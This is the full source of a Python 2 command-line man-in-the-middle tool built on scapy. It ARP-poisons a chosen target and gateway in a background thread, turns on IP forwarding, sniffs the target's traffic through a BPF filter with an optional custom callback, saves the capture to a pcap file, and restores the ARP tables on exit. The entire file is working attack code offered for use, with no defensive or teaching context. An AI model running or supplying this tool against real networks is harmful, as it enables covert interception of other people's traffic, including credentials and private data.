#!/usr/bin/python2
from __future__ import print_function
import os
import threading
import sys
import argparse
from scapy.all import *

from arp_attacker import ARP_attacker

parser = argparse.ArgumentParser(description='MiTM tool', usage='./mitm -i <interface> -t <target_ip> -g <gateway_ip>')
parser.add_argument('-i', '--interface', type=str, help='Interface to perform the attack on')
parser.add_argument('-t', '--target', type=str, help='Target IP to attack')
parser.add_argument('-g', '--gateway', type=str, help='Gateway IP address')
parser.add_argument('-f', '--filter', type=str, help='String to filter packets by')
parser.add_argument('-o', '--output', type=str, help='Capture file name', default='capture.pcap')
parser.add_argument('--callback', type=str, help='Name of a callback script')

args = parser.parse_args()

if args.interface is None or args.target is None or args.gateway is None:
    parser.print_help()
    sys.exit(0)

if args.callback is not None:
    args.callback = args.callback.replace('.py', '')
    callback = __import__(args.callback).callback
else:
    def callback(packet):
        pass

interface       = args.interface
target_ip       = args.target
gateway_ip      = args.gateway

conf.iface      = interface
conf.verb       = 0
done            = False
filename        = args.output

if not args.output.endswith('.pcap'):
    filename += '.pcap'

print('[*] Enabling IP forwarding...')
os.system('sysctl -w net.ipv4.ip_forward=1')

arp = ARP_attacker(target_ip, gateway_ip)

if arp.target_mac is None:
    print('[-] Failed to get target MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Target {} is at {}'.format(arp.target_ip, arp.target_mac))

if arp.gateway_mac is None:
    print('[-] Failed to get gateway MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Gateway {} is at {}'.format(arp.gateway_ip, arp.gateway_mac))

print('[*] Poisoning...')

poison_thread = threading.Thread(target=arp.poison)
poison_thread.start()

try:
    print('[*] Starting MITM... Press CTRL-C to stop.')

    bpf_filter = 'ip host {}'.format(arp.target_ip)
    if args.filter is not None:
        bpf_filter += ' && ' + args.filter

    packets = sniff(filter=bpf_filter, iface=interface, prn=callback)

finally:
    wrpcap(filename, packets)
    print('\r', end='')
    print(packets)
    print('[*] Cleaning up...')

    arp.restore()
    os.system('sysctl -w net.ipv4.ip_forward=0')

    print('[-] Exiting...')
